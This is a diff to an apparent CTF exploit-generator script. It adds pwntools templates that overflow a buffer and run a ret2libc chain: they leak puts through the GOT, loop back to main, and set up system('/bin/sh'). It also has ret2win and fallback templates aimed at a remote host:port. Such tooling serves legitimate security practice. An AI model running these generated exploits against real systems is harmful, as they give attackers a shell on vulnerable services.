@@ -69,14 +69,20 @@ def main():
     except Exception:
         offset = None
 
+    # Check for puts / printf for ret2libc leak chain when win() is absent
+    has_puts = "puts" in e.plt or "puts" in e.symbols
+    has_printf = "printf" in e.plt or "printf" in e.symbols
+    main_addr = e.symbols.get("main", None)
+
     off_str = str(offset) if (offset is not None and offset >= 0) else "OFFSET  # TODO: find via cyclic"
     win_str = hex(win_addr) if win_addr else "0x0  # TODO: set win() address"
     align = ("    payload += p64(ret)          # movaps stack alignment (64-bit)\n"
              if context.bits == 64 else "")
-    script = f'''#!/usr/bin/env python3
+
+    if win_addr:
+        script = f'''#!/usr/bin/env python3
 from pwn import *
 context.binary = exe = ELF({path!r}, checksec=False)
-# ret gadget for 64-bit stack alignment
 try: ret = next(exe.search(asm("ret"), executable=True))
 except Exception: ret = 0
 def conn():
@@ -88,6 +94,54 @@ payload  = b"A" * off
 io.sendline(payload)
 io.interactive()
 '''
+    elif has_puts and main_addr and context.bits == 64:
+        # 64-bit ret2libc scaffold with pop rdi; ret gadget
+        script = f'''#!/usr/bin/env python3
+# Auto-generated ret2libc exploit template
+from pwn import *
+context.binary = exe = ELF({path!r}, checksec=False)
+rop = ROP(exe)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+try: ret = next(exe.search(asm("ret"), executable=True))
+except Exception: ret = pop_rdi + 1
+
+def conn():
+    return remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process(exe.path)
+
+io = conn()
+off = {off_str}
+
+# Stage 1: Leak puts@got and loop back to main
+payload1 = b"A" * off
+payload1 += p64(pop_rdi)
+payload1 += p64(exe.got['puts'])
+payload1 += p64(exe.plt['puts'])
+payload1 += p64({hex(main_addr)})
+io.sendline(payload1)
+
+leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
+print(f"[*] Leaked puts: {{hex(leak)}}")
+
+# Stage 2: Calculate libc base & invoke system('/bin/sh')
+# libc = ELF("./libc.so.6")  # adjust libc version
+# libc.address = leak - libc.symbols['puts']
+# payload2 = b"A" * off + p64(ret) + p64(pop_rdi) + p64(next(libc.search(b"/bin/sh"))) + p64(libc.symbols['system'])
+# io.sendline(payload2)
+io.interactive()
+'''
+    else:
+        script = f'''#!/usr/bin/env python3
+from pwn import *
+context.binary = exe = ELF({path!r}, checksec=False)
+def conn():
+    return remote(sys.argv[1], int(sys.argv[2])) if len(sys.argv) > 2 else process(exe.path)
+io = conn()
+off = {off_str}
+payload = b"A" * off
+io.sendline(payload)
+io.interactive()
+'''
+
     out = os.path.join(workdir, "exploit.py")
     try:
         with open(out, "w") as fh:
@@ -97,6 +151,8 @@ io.interactive()
 
     print("WIN:", win_name, win_str)
     print("PRIMITIVES:", ", ".join(prims) or "none obvious")
+    if not win_addr and has_puts:
+        print("EXPLOIT_TYPE: ret2libc leak chain generated")
     print("OFFSET:", offset if offset is not None else "not auto-found")
     print("SCRIPT:", out)
 
